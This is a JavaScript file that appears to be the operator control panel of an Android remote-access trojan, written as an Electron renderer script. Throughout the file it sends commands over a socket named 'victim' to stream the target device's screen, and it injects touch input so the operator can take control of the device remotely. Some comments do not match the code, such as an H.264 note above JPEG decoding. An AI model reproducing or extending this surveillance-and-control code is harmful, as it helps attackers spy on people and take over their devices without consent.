const { remote, ipcRenderer } = require('electron');
const currentWindow = remote.getCurrentWindow();

class RemoteControlController {
    constructor() {
        this.canvas = document.getElementById('screen-canvas');
        this.ctx = this.canvas.getContext('2d');
        this.socket = currentWindow.webContents.victim;
        
        this.isStreaming = false;
        this.frameCount = 0;
        this.fps = 0;
        this.lastFrameTime = Date.now();
        this.fpsCounter = 0;
        this.fpsInterval = null;
        
        // UI elements
        this.startBtn = document.getElementById('start-btn');
        this.stopBtn = document.getElementById('stop-btn');
        this.latencyDisplay = document.getElementById('latency-display');
        this.fpsDisplay = document.getElementById('fps-display');
        this.frameCountDisplay = document.getElementById('frame-count');
        this.statusIndicator = document.getElementById('status-indicator');
        this.statusText = document.getElementById('status-text');
        
        this.initializeEventListeners();
        this.setupSocketListeners();
    }

    initializeEventListeners() {
        // Start button
        this.startBtn.addEventListener('click', () => {
            this.startRemoteControl();
        });

        // Stop button
        this.stopBtn.addEventListener('click', () => {
            this.stopRemoteControl();
        });

        // Canvas mouse events
        this.canvas.addEventListener('mousedown', (e) => {
            this.handleTouch(e, 0); // ACTION_DOWN
        });

        this.canvas.addEventListener('mousemove', (e) => {
            if (e.buttons === 1) { // Left button pressed
                this.handleTouch(e, 2); // ACTION_MOVE
            }
        });

        this.canvas.addEventListener('mouseup', (e) => {
            this.handleTouch(e, 1); // ACTION_UP
        });

        // Prevent context menu
        this.canvas.addEventListener('contextmenu', (e) => {
            e.preventDefault();
        });
    }

    setupSocketListeners() {
        if (!this.socket) {
            console.error('Socket not available');
            return;
        }

        // Listen for video frames
        this.socket.on('x0000rc', (data) => {
            try {
                if (data.type === 0x20 && data.data) {
                    // Video frame received
                    this.handleVideoFrame(data);
                }
            } catch (error) {
                console.error('Error handling socket data:', error);
            }
        });

        // Handle disconnect
        this.socket.on('disconnect', () => {
            this.updateStatus(false);
            this.stopRemoteControl();
        });
    }

    startRemoteControl() {
        if (this.isStreaming) {
            return;
        }

        // Send start command to victim
        this.socket.emit('order', {
            order: 'x0000rc',
            extra: 'start'
        });

        this.isStreaming = true;
        this.frameCount = 0;
        this.fpsCounter = 0;
        
        // Start FPS counter
        this.fpsInterval = setInterval(() => {
            this.fps = this.fpsCounter;
            this.fpsCounter = 0;
            this.fpsDisplay.textContent = this.fps;
        }, 1000);

        // Update UI
        this.startBtn.disabled = true;
        this.stopBtn.disabled = false;
        this.updateStatus(true);

        console.log('Remote control started');
    }

    stopRemoteControl() {
        if (!this.isStreaming) {
            return;
        }

        // Send stop command to victim
        this.socket.emit('order', {
            order: 'x0000rc',
            extra: 'stop'
        });

        this.isStreaming = false;

        // Stop FPS counter
        if (this.fpsInterval) {
            clearInterval(this.fpsInterval);
            this.fpsInterval = null;
        }

        // Update UI
        this.startBtn.disabled = false;
        this.stopBtn.disabled = true;
        this.updateStatus(false);

        // Clear canvas
        this.ctx.fillStyle = '#000';
        this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);

        console.log('Remote control stopped');
    }

    handleVideoFrame(data) {
        try {
            const timestamp = data.timestamp || Date.now();
            const latency = Date.now() - timestamp;

            // Decode Base64 image data
            const imageData = data.data;
            const img = new Image();
            
            img.onload = () => {
                // Draw to canvas
                this.ctx.drawImage(img, 0, 0, this.canvas.width, this.canvas.height);
                
                // Update stats
                this.frameCount++;
                this.fpsCounter++;
                this.frameCountDisplay.textContent = this.frameCount;
                this.latencyDisplay.textContent = `${latency} ms`;
            };

            // Create image from H.264 frame (simplified - in production use proper decoder)
            // For demo, assuming data is already in displayable format
            img.src = 'data:image/jpeg;base64,' + imageData;

        } catch (error) {
            console.error('Error handling video frame:', error);
        }
    }

    handleTouch(event, action) {
        if (!this.isStreaming) {
            return;
        }

        const rect = this.canvas.getBoundingClientRect();
        const x = Math.floor((event.clientX - rect.left) * (this.canvas.width / rect.width));
        const y = Math.floor((event.clientY - rect.top) * (this.canvas.height / rect.height));

        // Send touch event to victim
        this.socket.emit('order', {
            order: 'x0000rc',
            extra: 'touch',
            x: x,
            y: y,
            action: action
        });

        // Visual feedback
        this.drawTouchIndicator(x, y, action);
    }

    drawTouchIndicator(x, y, action) {
        const originalComposite = this.ctx.globalCompositeOperation;
        this.ctx.globalCompositeOperation = 'source-over';
        
        // Draw touch point
        this.ctx.fillStyle = action === 0 ? 'rgba(255, 0, 0, 0.5)' : 'rgba(0, 255, 0, 0.3)';
        this.ctx.beginPath();
        this.ctx.arc(x, y, 20, 0, 2 * Math.PI);
        this.ctx.fill();
        
        this.ctx.globalCompositeOperation = originalComposite;
        
        // Clear indicator after short delay
        setTimeout(() => {
            // Frame will be redrawn by video stream
        }, 100);
    }

    updateStatus(isActive) {
        if (isActive) {
            this.statusIndicator.classList.remove('inactive');
            this.statusIndicator.classList.add('active');
            this.statusText.textContent = 'Streaming';
        } else {
            this.statusIndicator.classList.remove('active');
            this.statusIndicator.classList.add('inactive');
            this.statusText.textContent = 'Disconnected';
        }
    }
}

// Initialize controller when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const controller = new RemoteControlController();
});

